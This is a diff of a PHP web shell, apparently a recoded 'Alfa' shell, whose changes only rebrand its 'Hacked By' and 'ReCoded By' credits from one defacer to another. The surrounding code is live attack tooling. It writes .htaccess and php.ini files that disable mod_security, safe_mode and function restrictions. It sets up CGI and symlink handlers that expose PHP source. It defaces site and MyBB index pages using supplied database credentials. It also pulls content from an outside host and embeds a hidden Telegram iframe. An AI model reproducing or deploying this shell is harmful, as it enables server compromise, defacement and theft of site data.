@@ -1552,7 +1552,7 @@ $news = new AlfaCURL();
 $about_us = $news->Send("http://solevisible.com/aboutus.php");
 if(empty($about_us)){
 $about_us = "<pre><center><img src='http://haxor.lol/love/Darkghoul-Perfect-Hunter-transformed.png'><br>
-<font color='#FFFFFF'>Shell ReCoded By HaxorWorld (LPH TEAM)</font><br>
+<font color='#FFFFFF'>Shell ReCoded By SeoDarkGhoul (LPH TEAM)</font><br>
 <font color='#00A220'>Contact : haxor@Darkghoulperfecthunter.com</font><br>
 </center></pre><iframe src='tg://resolve?domain=solevisible' frameborder='0' width='0' height='0'></iframe>";
 }
@@ -3413,7 +3413,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By HaxorWorld</title><b>Hacked By HaxorWorld</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By SeoDarkGhoul</title><b>Hacked By SeoDarkGhoul</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['alfa6'])){
@@ -3470,7 +3470,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By HaxorWorld</title><b>Hacked By HaxorWorld</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By SeoDarkGhoul</title><b>Hacked By SeoDarkGhoul</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['alfa8']=='>>'){
 $s0levisible="Powered By Darkghoul Perfect Hunter";
@@ -3514,7 +3514,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By HaxorWorld</title><b>Hacked By HaxorWorld</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By SeoDarkGhoul</title><b>Hacked By SeoDarkGhoul</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['alfa6'])){
 $mybb_dbh = $_POST['alfa6'];
 $mybb_dbu = $_POST['alfa7'];
@@ -3655,15 +3655,15 @@ echo "$val:";
 }echo "\n";}}
 }else{__alert('failed...');}}
 if(!empty($_POST['alfa2']) && isset($_POST['alfa2'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Recoded By HaxorWorld\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
+@__write_file($GLOBALS['cwd'].".htaccess","#Recoded By SeoDarkGhoul\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['alfa1'])&& isset($_POST['alfa1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By HaxorWorld(LPH TEAM)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By SeoDarkGhoul(LPH TEAM)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['alfa3']) && isset($_POST['alfa3'])){
-@__write_file($GLOBALS['cwd'].".htaccess","#Recoded By By HaxorWorld\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
+@__write_file($GLOBALS['cwd'].".htaccess","#Recoded By By SeoDarkGhoul\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
 echo '<center><b><big>htaccess for Litespeed created...!</center></b></big>';
 }
 echo "<br></div>";
@@ -5211,9 +5211,9 @@ function alfacgihtaccess($m,$d='', $symname=false){
 $readme = "";
 if($symname){$readme="\nReadmeName ".trim($symname);}
 if($m=='cgi'){
-$code = "#ReCoded By HaxorWorld\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .haxor\nAddHandler cgi-script .haxor";
+$code = "#ReCoded By SeoDarkGhoul\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .haxor\nAddHandler cgi-script .haxor";
 }elseif($m=='sym'){
-$code = "#ReCoded By HaxorWorld\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
+$code = "#ReCoded By SeoDarkGhoul\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
 }elseif($m=='shtml'){
 $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
 }
